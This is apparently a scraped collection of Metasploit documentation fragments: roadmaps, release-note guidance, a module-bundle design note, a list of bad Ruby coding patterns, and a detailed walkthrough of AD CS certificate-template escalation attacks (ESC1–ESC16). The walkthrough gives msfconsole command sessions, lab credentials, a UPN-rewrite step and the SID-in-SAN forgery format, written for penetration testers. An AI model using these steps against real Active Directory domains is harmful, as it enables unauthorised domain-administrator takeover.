    "content": "In 2017, we published our first open roadmap for Metasploit development. How did we do? For achievements: . | The Metasploit data model backend: we did a lot of design work on this, and got a couple of initial Proof-of-Concept project built. You can see a video of it here: https://www.youtube.com/watch?v=hvuy6A-ie1g. In the mean time, we started merging parts of the main development branch . | The first pass of external session handling landed with the metasploit-proxy project. | Independent modules that run in isolation did land, along with a hand full of new modules demonstrating the advantages of the design, including multi-language support. | The ruby_smb project made a lot of progress, with support incorporated into several existing modules. Full client-side support is also available for testing now. | Native iOS and macOS support landed, along with many new IoT and router exploits. | Meterpreter shrank almost 4x thanks to the new cryptTLV packet obfuscation support, and the removal of OpenSSL. | . Things we didn’t quite finish: . | Metasploit’s RESTful interface was not complete in 2017, so we will continue it into 2018. | Session handling as a separate process was implemented with the https://github.com/rapid7/metasploit-aggregator project, but more work needs to be done to improve scalability and usability. | Asynchronous session support remains on the drawing board. | SOCKS5 support did not land, but Metasploit did gain a lot more support for running modules externally as separate processes, and gained initial support for running modules in Python. | Modernized payload generation with new tools continues to be researched. | .

    "content": "Starting in 2017, we will provide an open roadmap for setting our goals for the year. The goals are based on many discussions we have had over the past year with users, developers, and customers. The intent is to provide focus for core developers and contributors alike, so that we can together work toward a common vision for how we want Metasploit to evolve. This year, the themes for Metasploit are modularity, reusability, and reliability. Metasploit has grown organically over the years into a very large project, combining thousands of modules, payloads, a database, session handling, user interaction and more into a single monolithic application. While the design has served us well, it has reached some limits for maintainability and agility. While we continue to refactor, improve, and reorganize Metasploit, large-scale improvements become increasingly difficult and highlight fragility in the overall system, due to its highly interdependent design. We want to allow users to effortlessly contribute to the portions of Metasploit they are interested in, and be able to reuse code, both from inside and and outside of the project. Language and licensing constraints have presented barriers to users, both real and imagined. Python, Go, C# and other languages are dominating influences on the infosec community. We would like to be able to welcome more developers, researchers, and tooling into the Metasploit ecosystem, taking advantage of the best-in-breed and avoiding not-invented-here syndrome wherever possible. In short, we want to develop reusable, modular, and reliable services to enable researchers, pen-testers, students, and red-teamers to work efficiently, have access to the latest technologies and techniques, and to continue to grow the Metasploit community.

    "title": "The roadmap",
    "content": ". | The Metasploit data model backend should be separated into its own project. Plans include a data service that provides a RESTful interface, both an event-oriented and classic workspace-oriented view of incoming data, improved performance, and easy direct interoperability with other tools. | Session handling should be able to operate independently of framework, allowing users to share sessions and allowing servers to be as performant, reliable, and light-weight as possible. We have already begun a project called ‘metasploit-aggregator’ which is a first generation of this design. Once this is complete, direct integration into other frameworks should also be possible. | Metasploit should support asynchronous sessions. Many testers today use asynchronous frameworks like Empire to maintain light-weight persistence or a footholds into a network, then have to pivot to Meterpreter for interactive sessions. We would like to be able seamlessly support both modes of operation, including the ability to run post exploitation modules and modules over pivots asynchronously as well. | Metasploit should support running exploit and auxiliary modules in an isolated mode. Plans are underway to support supporting an RPC-style module API to Metasploit framework, providing core services like payload and session handling, network routing, reporting and logging. Modules are run as child processes to Metasploit, and are only loaded into memory as-needed. Networking from a module point-of-view will be handled via SOCKS5 proxy support, hooking the child environment, or remote API calls, largely removing the need for specially-crafted socket objects or changes to 3rd-party protocol libraries. Modules, when written for the Metasploit API, could even be tested and used independently from the full Metasploit framework. | . In addition to these primary goals, we’d also like to explore: . | SMB 2.0 SMB 1.0 increasingly being disabled in many networks, making Metasploit modules using this protocol ineffective. We would like to implement at least server-side support for SMB 2.0, both for sharing files and for named pipe communications. | iOS and macOS support The mettle and python meterpreter payloads will continue evolving to further support OS X and iOS, along with more post exploitation support. | Native Android support in Mettle We began the work last year with mettle now supporting all of the basic operations for a Meterpreter implementation. We would like to continue adding Android post-exploitation capabilities to mettle as well. | Streamlining Windows Meterpreter mettle soon will replace the original POSIX meterpreter, which will reduce the size of the Windows meterpreter. Switching from OpenSSL to native SChannel support will simplify and shrink Windows meterpreter, allowing to focus on what it supports best. | Router and IoT research We would like to continue research and support for embedded device exploitation and first-class support for resource-constrained environments. | Modernizing payload generation We are investigating being able to integrate with third-party toolchains for building assembly, C, .NET, Java, on the fly, making it easy for a user to acquire the and use the tools, while providing first-class support for many architectures and platforms. | .

An enhancement indicates that an improvement or new feature has been added to the framework. Enhancements include things like auxiliary modules, post-exploitation modules, and new payloads. When you write release notes for an enhancement, you should try to answer the following questions: . | What is the enhancement? | Why is it valuable or important to users? | How can they use it? | . For example, the following is a release note for an enhancement: . The new ‘resolve’ command enables you to perform DNS lookups with Meterpreter, without leaving the session to run additional modules. To resolve host names on the target, you can run the ‘resolve’ command followed by the host name. For example, in the Meterpreter prompt, you can type something like ‘resolve rapid7.com’ to view the host resolutions for Rapid7. Release Notes for Fixes . A fix is for an issue that caused a particular feature or functionality to not work the way it’s expected to work. Basically, a defect indicates that something was broken, and we’ve fixed it. When you write release notes for a fix, you should try to answer the following questions: . | What was broken? | How was it fixed? | Why is this important to users? | . Here’s an example for a fix: . The email header contained duplicate date and subject headers, which caused email servers like AWS SES, to reject the emails. This fix removes the duplicate headers so that campaigns can send emails successfully. Release Notes for Modules . An exploit is a module that takes advantage of a vulnerability and provides some type of access to the target. We call out exploits explicitly because they’re the hotness. When you write release notes for an exploit, you should try to answer the following questions: . | What vulnerability is the module exploiting? | What type of access can you achieve with the module? | Do you need credentials to exploit the vulnerability? | . And finally, here’s an example for exploits: . This module allows you to exploit HP Data Protector, a backup and recovery system, to remotely upload files to the file share.

The chart above showcases how one can go about attacking each of the AD CS vulnerabilities supported by Metasploit, taking advantage of various flaws in how certificate templates are configured on an Active Directory Certificate Server. The following sections will walk through each of these steps, starting with enumerating certificate templates that the server has to offer and identifying those that are vulnerable to various misconfigurations and security flaws, followed by creating new certificates using these certificate templates with the icpr_cert Metasploit module, and finally using these certificates to authenticate to the domain as the domain administrator via Kerberos. Each certificate template vulnerability that will be discussed here has a ESC code, such as ESC1, ESC2. These ESC codes are taken from the original whitepaper that SpecterOps published which popularized these certificate template attacks, known as Certified Pre-Owned. In this paper Will Schroeder and Lee Christensen described 8 different domain escalation attacks that they found they could conduct via misconfigured certificate templates: . | ESC1 - Domain escalation via No Issuance Requirements + Enrollable Client Authentication/Smart Card Logon OID templates + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT . | Exploit Steps | . | ESC2 - Domain escalation via No Issuance Requirements + Enrollable Any Purpose EKU or no EKU . | Exploit Steps | . | ESC3 - Domain escalation via No Issuance Requirements + Certificate Request Agent EKU + no enrollment agent restrictions . | Exploit Steps | . | ESC4 - Domain escalation via misconfigured certificate template access control . | Exploit Steps | . | ESC5 - Domain escalation via vulnerable PKI AD Object Access Control | ESC6 - Domain escalation via the EDITF_ATTRIBUTESUBJECTALTNAME2 setting on CAs + No Manager Approval + Enrollable Client Authentication/Smart Card Logon OID templates | ESC7 - Vulnerable Certificate Authority Access Control | ESC8 - NTLM Relay to AD CS HTTP Endpoints . | Exploit Steps | . | . Later, additional techniques were disclosed by security researchers: . | ESC9 - No Security Extension - CT_FLAG_NO_SECURITY_EXTENSION flag set in msPKI-EnrollmentFlag. Also StrongCertificateBindingEnforcement not set to 2 or CertificateMappingMethods contains UPN flag. | Certipy 4.0: ESC9 &amp; ESC10, BloodHound GUI, New Authentication and Request Methods — and more! | Exploit Steps | . | ESC10 - Weak Certificate Mappings - HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SecurityProviders\\Schannel CertificateMappingMethods contains UPN bit aka 0x4 or HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Kdc StrongCertificateBindingEnforcement is set to 0. | Certipy 4.0: ESC9 &amp; ESC10, BloodHound GUI, New Authentication and Request Methods — and more! | Exploit Steps | . | ESC11 - Relaying NTLM to ICPR - Relaying NTLM authentication to unprotected RPC interface is allowed due to lack of the IF_ENFORCEENCRYPTICERTREQUEST flag on Config.CA.Interface.Flags. | Relaying to AD Certificate Services over RPC | . | ESC12 - A user with shell access to a CA server using a YubiHSM2 hardware security module can access the CA’s private key. | Shell access to ADCS CA with YubiHSM | . | ESC13 - Domain escalation via issuance policies with group links. | ADCS ESC13 Abuse Technique | Exploit Steps | . | ESC14 - Explicit certificate mappings through altSecurityIdentities write access abuse . | ADCS ESC14 Abuse Technique | . | ESC15 (AKA EKUwu) - Domain escalation via No Issuance Requirements + CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Policy OID manipulation . | EKUwu: Not just another AD CS ESC | Exploit Steps | . | ESC16 - Security Extension Disabled on CA (Globally) . | ESC16 - Security Extension Disabled on CA Currently, Metasploit only supports attacking ESC1, ESC2, ESC3, ESC4, ESC8, ESC9, ESC10, ESC13, ESC15 and ESC16. | . | Exploit Steps | . Before continuing, it should be noted that ESC1 is slightly different than ESC2 and ESC3 as the diagram notes above. This is because in ESC1, one has control over the subjectAltName field in the generated certificate, which is also known as the SAN field. This field allows one to specify who the certificate should authenticate as. Therefore, all an attacker needs to do is simply modify this field and they can gain a certificate that allows them to authenticate as any user they wish. ESC2 is similar to ESC1 in all respects, however it differs in one key area. This is because, unlike ESC1 vulnerable certificate templates, you cannot edit the subjectAltName field, of ESC2 vulnerable certificate templates. Additionally, ESC2 certificate templates define the Any Purpose extended key usage (EKU) or no EKU at all. This last part is important as it allows an attacker to utilize the ESC2 vulnerable certificate template to create a new certificate that can be used to authorize to log into a domain via Kerberos on behalf of any other user, thereby granting them access to the domain as that user. Note that certificates with no EKU at all will need to be trusted by the NTAuthCertificates object (which it won’t be by default), otherwise new certificates that are created using the vulnerable ESC2 certificate template will not work for domain authentication. This restriction does not apply for those certificates vulnerable to ESC2 which have the Any Purpose EKU applied to them. Next, ESC3 is fairly similar to ESC2, however it differs in two ways: a different EKU is abused, and the attacker also needs to utilize two different misconfigured certificate templates in order to exploit the vulnerability. The EKU in question this time is the Certificate Request Agent EKU, aka OID 1.3.6.1.4.1.311.20.2.1, which allows one to enroll for a certificate on behalf of another user, which may seem unusual, but this a common scenario within Microsoft environments. To abuse this EKU, an attacker must have the following two vulnerable certificate templates: . | A certificate template which has all the same permissions as ESC1, however it also has the Certificate Request Agent EKU set on it, aka OID 1.3.6.1.4.1.311.20.2.1. This certificate template is labeled as ESC3_TEMPLATE_1 within the output of the ldap_esc_vulnerable_cert_finder module we will use later on. | A certificate template that allows low privileged users to enroll in it, and has manager approval disabled, same as ESC1. However it also has either: . | A template schema of 1 | A template schema of 2 or greater and an Application Policy Issuance Requirement requiring the Certificate Request Agent EKU so that only those who have a certificate with this requirement can enroll in them. It must also define an EKU that allows for domain authentication, same as ESC1, and there must be no enrollment restrictions on the Certificate Authority (CA) server in question. This certificate template is labeled as ESC3_TEMPLATE_2 within the output of the ldap_esc_vulnerable_cert_finder module we will use later on. | . | . If both of these criteria are met then the attacker can enroll in one of the ESC3_TEMPLATE_1 vulnerable certificate templates as a low privileged user in order to get a certificate that will grant them Certificate Request Agent permissions. They can then use these permissions to enroll in a ESC3_TEMPLATE_2 vulnerable certificate template and request a certificate on behalf of another user, such as the domain administrator, and utilize the fact that the certificate template allows for domain authentication to log into the domain via Kerberos as that user.

    "title": "Finding Vulnerable ESC Templates Using ldap_esc_vulnerable_cert_finder",
    "content": "Before one can exploit vulnerable ESC templates to elevate privileges, it is necessary to first find a list of vulnerable templates that exist on a domain. To do this we can run the auxiliary/gather/ldap_esc_vulnerable_cert_finder module. This module will connect to the LDAP server on a target Domain Controller (DC), and will run a set of LDAP queries to gather a list of certificate authority (CA) servers and the vulnerable certificate templates they make available for enrollment. It will then also query the permissions on both the CA and the certificate template to figure out which users or groups can use that certificate template to elevate their privileges. Currently the module is capable of checking for certificates that are vulnerable to ESC1, ESC2, ESC3, ESC13 and ESC15. The module is limited to checking for these techniques due to them being identifiable remotely from a normal user account by analyzing the objects in LDAP. Keep in mind though that there are two sets of permissions in play here though. There is one set of permissions on the CA server that control who is able to enroll in any certificate template from that server, and second set of permissions that control who is allowed to enroll in a specific certificate template, which is applied to the certificate template itself. Therefore, the module will also specify which users are allowed to enroll in a specific template on a specific CA server, in order to make it as clear as possible which users or groups one needs to have access to in order to exploit the vulnerable certificate template. The following diagram showcases how this permissions check works in a more visual manner: . flowchart TD user[User] --&gt; firstcheck{CA Server Allows Enrollment?} firstcheck{CA Server Allows Enrollment?} -- YES --&gt; secondcheck{Certificate Template Allows Enrollment?} firstcheck{CA Server Allows Enrollment?} -- NO --&gt; denied[Access Denied] secondcheck{Certificate Template Allows Enrollment?} -- NO --&gt; denied[Access Denied] secondcheck{Certificate Template Allows Enrollment?} -- YES --&gt; success[Access Granted!] . To run the module, you will need to have the login credentials of a domain joined user. The specific permissions of this user should not matter though, since most LDAP servers in an Active Directory (AD) environment are configured in such a way that they allow users to read most objects, but not write to them. For our purposes, since we just need to read the details of the certificate templates that are available, this means normal user permissions should be sufficient. To run the module, specify the login credentials for an AD user, and set RHOSTS to the address of one of the Domain Controller (DC) IP addresses, then enter run. This will cause the module to log into the LDAP server on the target DC, and list out the vulnerable certificate templates and which CA servers they are available from, as well as the permissions that are required to enroll in these certificate templates. The following is a sample output of running this against a test server: . msf &gt; use auxiliary/gather/ldap_esc_vulnerable_cert_finder msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) &gt; show options Module options (auxiliary/gather/ldap_esc_vulnerable_cert_finder): Name Current Setting Required Description ---- --------------- -------- ----------- BASE_DN no LDAP base DN if you already have it DOMAIN no The domain to authenticate to PASSWORD no The password to authenticate with REPORT_NONENROLLABLE false yes Report nonenrollable certificate templates REPORT_PRIVENROLLABLE false yes Report certificate templates restricted to domain and enterprise admin RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit -framework/wiki/Using-Metasploit RPORT 389 yes The target port SSL false no Enable SSL on the LDAP connection USERNAME no The username to authenticate with View the full module info with the info, or info -d command. msf auxiliary(gather/ldap_esc_vulnerable_cert_finder) &gt;

. From the output above we can determine that the SubCA certificate template is vulnerable to several attacks. However, whilst the issuing CAs allow any authenticated user to enroll in this certificate, the certificate template permissions prevent anyone but Domain Administrators and Enterprise Admins from being able to enroll in this certificate template. At that point you probably don’t need to elevate your privileges any higher, so this certificate template isn’t that useful for us. Moving onto the next certificate template we see that ESC1-Template is vulnerable to the ESC1 attack, has permissions on the template itself that allow for enrollment by any authenticated domain user, and has one issuing CA, daforest-WIN- BR0CCBA815B-CA, available at WIN-BR0CCBA815B.daforest.com, which allows enrollment by any authenticated user. This means that any user who is authenticated to the domain can utilize this template with a ESC1 attack to elevate their privileges. Looking at ESC2-Template we can see the same story however this time the template is vulnerable to an ESC2 attack. ESC3-Template1 is also the same but is vulnerable to ESC3_TEMPLATE_1 attacks, and ESC3-Template2 is the same but vulnerable to ESC3_TEMPLATE_2 attacks. We also see that the User template is vulnerable to ESC3_TEMPLATE_2 attacks and the fact that it is enrollable from Domain Users and that daforest-WIN-BR0CCBA815B-CA allows enrollment in it by any authenticated user confirms the theory that this can be exploited by any authenticated attacker for an ESC3_TEMPLATE_2 attack. Another interesting one to note is the Machine template, which allows any domain joined computer to enroll in it, and who’s issuing CA allows any authenticated user to request it. With this we now have a list of certificates that can be utilized for privilege escalation. The next step is to use the ipcr_cert module to request certificates for authentication using the vulnerable certificate templates. ",

This will grant us a certificate for our current user that is based off of the vulnerable ESC2-Template: . msf &gt; use auxiliary/admin/dcerpc/icpr_cert msf auxiliary(admin/dcerpc/icpr_cert) &gt; set RHOSTS 172.30.239.85 RHOSTS =&gt; 172.30.239.85 msf auxiliary(admin/dcerpc/icpr_cert) &gt; set CA daforest-WIN-BR0CCBA815B-CA CA =&gt; daforest-WIN-BR0CCBA815B-CA msf auxiliary(admin/dcerpc/icpr_cert) &gt; set CERT_TEMPLATE ESC2-Template CERT_TEMPLATE =&gt; ESC2-Template msf auxiliary(admin/dcerpc/icpr_cert) &gt; set SMBDomain DAFOREST SMBDomain =&gt; DAFOREST msf auxiliary(admin/dcerpc/icpr_cert) &gt; set SMBPass normalpass SMBPass =&gt; normalpass msf auxiliary(admin/dcerpc/icpr_cert) &gt; set SMBUser normaluser SMBUser =&gt; normaluser msf auxiliary(admin/dcerpc/icpr_cert) &gt; show options Module options (auxiliary/admin/dcerpc/icpr_cert): Name Current Setting Required Description ---- --------------- -------- ----------- ALT_DNS no Alternative certificate DNS ALT_UPN no Alternative certificate UPN (format: USER@DOMAIN) CA daforest-WIN-BR0CCBA815B-CA yes The target certificate authority CERT_TEMPLATE ESC2-Template yes The certificate template ON_BEHALF_OF no Username to request on behalf of (format: DOMAIN\\USER) PFX no Certificate to request on behalf of RHOSTS 172.30.239.85 yes The target host(s), see https://github.com/rapid7/metas ploit-framework/wiki/Using-Metasploit RPORT 445 yes The target port (TCP) SMBDomain DAFOREST no The Windows domain to use for authentication SMBPass normalpass no The password for the specified username SMBUser normaluser no The username to authenticate as Auxiliary action: Name Description ---- ----------- REQUEST_CERT Request a certificate View the full module info with the info, or info -d command. msf auxiliary(admin/dcerpc/icpr_cert) &gt; run [*] Running module against 172.30.239.85 [*] 172.30.239.85:445 - Requesting a certificate...

    "title": "Exploiting ESC3 To Gain Domain Administrator Privileges",
    "content": "To exploit ESC3 vulnerable templates we will use a similar process to ESC2 templates but with slightly different steps. First, let’s return to the earlier output where we can find several templates that are vulnerable to ESC3 attacks. However we need to split them by attack vector. The reason is that the first half of this attack needs to use the ESC3_TEMPLATE_1 vulnerable certificate templates to enroll in a certificate template that has the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) that allows one to request certificates on behalf of other principals (such as users or computers). The second part of this attack will then require that we co-sign requests for another certificate using the certificate that we just got, to then request a certificate that can authenticate to the domain on behalf of another user. To do this we will need to look for certificates in the ldap_esc_vulnerable_cert_finder module which are labeled as being vulnerable to the ESC3_TEMPLATE_2 attack. The list of ESC3_TEMPLATE_1 vulnerable templates is pretty short and consists of a single template: . | ESC3-TEMPLATE-1 - Vulnerable to ESC3_TEMPLATE_1 and allows enrollment via any authenticated domain user. | . ESC3_TEMPLATE_2 are more plentiful though and we can find a few that are of interest: . | SubCA - Again as mentioned earlier can only be enrolled in by Domain Admins and Enterprise Admins, so not a viable vector. | ESC3-Template2 - Enrollable via any authenticated domain user. | User - Enrollable via any authenticated domain user. | Administrator - Can only be enrolled in by Domain Admins and Enterprise Admins, so not a viable vector. | Machine - No real overlap between Domain Computers and Authenticated Users I don’t think? | DomainController - Can only be enrolled in by Domain Admins and Enterprise Admins, so not a viable vector. | . Narrowing this list down to those we can actually enroll in as users, this leaves us with User and ESC3-Template2 as templates that can be used for the second part of this vulnerability.

    "content": "ESC8 leverages relaying NTLM authentication from an SMB server (running on Metasploit) to the HTTP(S) AD CS Web Enrollment portal running on a remote target. The attacker will need to coerce a client with privileges to authenticate to the target portal to authenticate to Metasploit instead. This can be achieved via a few techniques, including name poisoning via the capture plugin, coercion via the auxiliary/scanner/dcerpc/petitpotam module, or even a well placed UNC path. Once authentication has been relayed and an authorized HTTP session has been established, the attacker can query available certificate templates as well as issue them. Exploitation of this flaw is facilitated through the auxiliary/server/relay/esc8 module which handles starting the SMB relay server and enables configuration of what happens when relaying is successful. Users can select from different operational “modes” via the MODE datastore option which controls what the module will do. For a full description, see the modules documentation.

    "title": "Overview of exploiting ESC9 and ESC10 with Metasploit",
    "content": "ESC9 and ESC10 are similar certificate misconfiguration abuse techniques. They both involve having credentials of a user, say “user1”, who has GenericWrite privileges over “user2”. This allows an attacker as “user1” to update either the userPrincipalName or dNSHostName attribute of “user2”. In order to update the attribute, we need to authenticate via LDAP - which is a unique requirement compared to the other ESC techniques and is why there is a separated module called esc_update_ldap_object which combines the attribute update via LDAP and certificate issuance process. If the AD CS server is configured to allow “weak certificate mappings” when a user is requesting a certificate, the server will check the userPrincipalName or the dNSHostName of the requesting identity and then issue a certificate based on that value. Therefore if we can update “user2”’s UPN to “Administrator” and then request a certificate on behalf of “user2” we can get an Administrator certificate (easy priv esc horay). That is the essence of both ESC9 and ESC10 minus a number of details we’ll get into. It’s also worth noting that the following registry keys and preventative measure and exploit techniques (ESC9 and 10) all stem from Microsoft attempts to patch CVE-2022–26923 (aka Certifried). During this effort they implemented the new szOID_NTDS_CA_SECURITY_EXT security extension for issued certificates, which will embed the objectSid property of the requester, to help facilitate “strong certificate mappings”, along with the following registry keys and certificate template flags.

Now we can see the above template is possibly exploitable if the StrongCertificateBindingEnforcement is set to 1. In our case it is so we can proceed with exploitation. We will set a number of datastore options in order to exploit ESC9 in this scenario. We will set RHOSTS, CERT_TEMPLATE, and CA as we normally would. In order to update the UPN of the target user we must connect to LDAP and so the datastore options LDAPUsername, LDAPPassword, and LDAPDomain are the credentials of the user who has GenericWrite privileges over the TARGET_USERNAME. Note LDAPRport must be set in order to connect however it defaults to 389. The option UPDATE_LDAP_OBJECT is an enum that can be set to either userPrincipalName or dNSHostName and must be set in order to instruct the module to attempt to exploit ESC9 or ESC10. We will set UPDATE_LDAP_OBJECT to userPrincipalName in this case and so we then must set UPDATE_LDAP_OBJECT_VALUE to Administrator. It’s important for this scenario, when updating the UPN to omit the domain suffix from the UPN to avoid conflicts with other UPNs in the domain, which by default all contain the suffix. The UPN processing order will still allow the DC to map the UPN Administrator in our writable account to the actual administrator, making its impersonation possible. It’s also important to note that after issuing the certificate we must revert the userPrincipalName of the TARGET_USERNAME back to the original value before attempting to use the certificate or the certificate will not work. This is done automatically by the module. In the following example, the ESC9-Template template is vulnerable to ESC9 and will yield a ticket for Administrator once complete. msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set rhosts 172.16.199.200 rhosts =&gt; 172.16.199.200 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldaprport 389 ldaprport =&gt; 389 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set target_username user2 target_username =&gt; user2 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldapdomain kerberos.issue ldapdomain =&gt; kerberos.issue msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldappassword N0tpassword! ldappassword =&gt; N0tpassword! msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ldapusername user1 ldapusername =&gt; user1 msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set cert_template ESC9-Template cert_template =&gt; SpencerTest msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set ca kerberos-DC2-CA ca =&gt; kerberos-DC2-CA msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; set UPDATE_LDAP_OBJECT_VALUE Administrator UPDATE_LDAP_OBJECT_VALUE =&gt; Administrator msf6 auxiliary(admin/dcerpc/esc_update_ldap_object) &gt; run [*] Running module against 172.16.199.200 [*] 172.16.199.200:445 - Loading auxiliary/admin/ldap/ldap_object_attribute [*] 172.16.199.200:445 - Running auxiliary/admin/ldap/ldap_object_attribute [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST [*] Current value of user2's userPrincipalName: user2 [*] Attempting to update userPrincipalName for CN=user2,CN=Users,DC=kerberos,DC=issue to Administrator...

However, if the CA is also vulnerable to ESC6, which is defined as: EDITF_ATTRIBUTESUBJECTALTNAME2 flag is set under it’s EditFlags registry key, located here: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\&lt;CA-Name&gt;\\PolicyModules\\&lt;PolicyModuleName&gt;\\ then the CA accepts arbitrary SAN values from certificate request attribute and an attacker can still bypass strong certificate mapping. In this case, the attacker requests a certificate from the ESC16-affected CA using any client authentication template (like “User”), which ensures the SID security extension is omitted. At the same time, they exploit the ESC6 weakness to inject a custom Subject Alternative Name that includes both a forged UPN and a specially crafted SID value using the format: URI:tag:microsoft.com,2022-09-14:sid:&lt;SID&gt;. This format was introduced in the May 2022 KB5014754 update and intended to help support strong certificate mappings between the user SID and the certificate. Because the certificate lacks the official SID extension (due to ESC16) but includes a valid-looking SAN SID URI (via ESC6), the domain controller accepts it and maps the certificate using the supplied SID—even in Full Enforcement mode.

    "content": "Created by Adam Cammack . As Metasploit modules continue to grow in number and capability the current separation of module information by type grows more cumbersome. Starting next year, we want all the files related to a module (docs, libraries, sources, build info, etc.) to live as closely together and be as hackable as possible. To this end, we have come up with the concept of “module bundles” to help improve module dependency isolation and locality of information. We hope the format will prove flexible enough to accommodate the wide range of modules we have and uniform enough to not cause confusion among community members and contributors. Eventually, we may even be able to package each module separately for distribution. Whether or not this bundled format will support the old style of module is uncertain. It could be made to work, I think, but it would require a fair bit of effort and ingenuity to work cleanly. For simplicity, I will describe the bundle concept as it applies to external/coldstone modules and then describe potential adaptations at the end. ",

The most minimal module only requires the main executable to be present.

    "title": "Keeping it all close",
    "content": "One of the drawbacks of the current module system is that all the files related to the development, documentation, and execution of a module live in different places. Some information, like dependencies, is only tracked implicitly or lossily in code or in the top-level specifications of framework. This makes programmatically determining what a module is, targets, or requires fraught with fragile code. Metadata . The metadata will be kept in JSON in a file (or several, see my uncertainties above) that is built by rake. Keeping the metadata cached per-module gives us several capabilities. First, updates look more logical in commits, and the files can be updated as part of the standard PR/landing process. Next, dependency tracking of when the metadata needs to be updated can be offloaded to standard build tool capabilities. Because invoking rake has overhead, any metadata that exists should be considered correct during initial module discovery. Any modules without metadata should then have it generated via rake. Next, every module should have its metadata building task run to (and stale metadata replaced) ensure correctness. If a module is use’d before this process completes, it must have it metadata refreshed via rake if needed as part of the loading process. Since modules are independent, the whole discovery/refreshing process is parallelizable, reducing wall time. In addition to the information we currently cache, we will want to cache any information a user might see or want to know so that, if the cached metadata is more recent than any module files, nothing has to be built or run to use the module. Notably, this includes options and module archetype (which in the future directly map options for user convince, vs the shim approach take today). Build info . All additional build info should be specified as tasks in the module Rakefile. As much a possible, this should also include building with IDE environments, like Visual Studio. Even if the binaries are checked in to reduce runtime requirements (see below), it is still invaluable to know how something was built in the first place. Blobs and sources . Sources are handy, it should be easy to find them! Now they will live in the module in the src/ directory. Here the Rakefile can easily find them and transform them into the beautiful exploitation resources they were meant to be. As much as possible, only sources should be checked into the tree. For super-specific platform targeting things though, that’s not always feasible (eg. VisualStudio projects). It’s times like these that the data/ directory should be used. As mentioned above, the Rakefile should still be able to build the thing given the correct environment. Blobs or assets without a checked-in source also belong in data/, like images or downloaded things. Things for client exploits to download should probably also go in here, like HTML files and static JavaScripts. Templates . Modules that use a large literal interspersed with runtime data should use the templates/ directory to store templates. ERB should be used for printable data by Ruby, and equivalents for other languages (DTL, mustache, etc.). Binary data should maybe be blobs with accompanying offset listings? . Docs . The docs/ directory will contain the files that a user will reference when trying to understand module. This may include PoCs, markdown, pcaps, etc. The HTML we currently show to users would be generated from the module and files here using rake tasks. Additional tooling . One advantage that this directory structure gives us is the ability to write better tooling for it than we have for the current iteration of modules. One downside is that we will need it to in order to make the format accessible to hackers. Shared build tasks . Because all routine module-oriented tasks will be performed with rake tasks, we will need to make the default actions for these tasks as intelligent and reusable as possible across different module types/implementations. A module author should not have to worry about writing plumbing they do not need (or is common) or messing with plumbing that is only tangentially related to their unique need. To that end, we should have sane defaults for the following at a minimum: . rake run -- Start module, hook up stdin/stdout to JSON-RPC rake metadata -- Generate metadata JSON rake tidy:code -- Run tidiness checks against the code rake tidy:metadata -- Run tidiness checks against the metadata rake doc:text -- Combine all docs into a plain-text, human readable thing rake doc:html -- Similar to today's info -d rake deps -- Install dependencies local to the current user, if possible rake deps:check -- Check to see if a module can likely be run in the current environment rake build -- Build files that need it, defaults: src/FILE.s =&gt; data/FILE (extracted from exe format), ...? rake clean -- Remove generated files rake clobber -- Reset to pristine, checked-out state . Module generation . At the very least, we will also need tooling to create a mostly-empty but runnable module so that an author knows what to poke when writing. This skeleton can be augmented by questions that can help us use different archetypes, like payload vs. remote, or Ruby vs. Python. These commands could also point the author to relevant module writing articles/documentation. For classic modules . The biggest differences for classic modules are metadata generation and running. These can be accomplished with rake tasks, but it would involve starting up a whole framework instance for each module run. For efficiency, we will need to signal to framework to treat the module specially, perhaps having rake deps:check output/return a specific value when the module needs to be run inside of framework. Metadata would then be dumped directly from the framework loader, and instead of rake run, the classic module loader/runner would be run much as it is today. We will probably want to keep the rake tasks for these things for when we don’t already have a framework instance handy. ",

This is a collection of all the bad code we often see in Metasploit modules. You should avoid them, too. Note: Some of these examples use puts() for demo purposes, but you should always use print_status / print_error when writing a module. Bad Examples You Should NOT Follow: . | Not checking the return value of a Metasploit API | Ruby 1.9.3 vs 1.8.7… gotcha! | Not checking the return value when using match() | Not checking nil before accessing a method | Using exception handling to shut an error up | Not taking advantage of the ‘ensure’ block | Adding the ‘VERBOSE’ option | Neglecting to use ‘vars_post’ for send_request_cgi() when crafting a POST request | Bad variable naming style | Using global variables | Modifying the datastore during execution | . 1. Not checking the return value of a Metasploit API . res = send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; '/app/index.php' }) # There's a bug here, because res can return nil (due to a timeout or other reasons) # If that happens, you will hit a \"undefined method `code' for nil:NilClass\" error. # The correct way should be: if res &amp;&amp; res.code == 200 if res.code == 200 print_status(\"Response looks good\") else print_error(\"Unexpected response\") end . 2. Ruby 1.9.3 vs 1.8.7… gotcha! . some_string = \"ABC\" # This can cause unexpected results to your module. # Better to always do: char = some_string[1, 1] char = some_string[1] if char == 'B' puts \"You will see this message in Ruby 1.9.3\" elsif char == 66 puts \"You will see this message in Ruby 1.8.7\" end . # 1.9 allows a comma after the last argument when calling # a method while 1.8 does not. The most common place to # see this error is in the update_info() section in a # module's constructor. some_method( \"arg1\", \"arg2\", # &lt;-- This comma is a syntax error on 1.8.x ) . 3. Not checking the return value when using match() . str = \"dragon! drag on! Not lizard, I don't do that tongue thing\" # This tries to print \"Not snake\", but it's not in the string, # so you'll get this error: \"undefined method `[]' for nil:NilClass\" puts str.match(/(Not snake)/)[0] . # The above is better written as: if (str =~ /(Not snake)/) puts $1 end . 4. Not checking nil first before accessing a method . str = \"These things are round and 